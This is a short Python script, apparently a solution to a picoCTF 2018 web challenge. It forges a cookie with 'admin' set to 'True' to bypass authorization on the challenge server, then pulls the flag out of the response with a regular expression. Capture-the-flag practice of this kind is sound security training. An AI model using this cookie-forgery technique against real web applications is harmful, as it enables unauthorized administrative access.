import requests
import re
cookie = {'admin': 'True', 'password': '', 'username': ''}
r = requests.get('http://2018shell.picoctf.com:5477/flag', cookies=cookie)
source = r.text
print(re.findall(r'(picoCTF\{.+\})', source))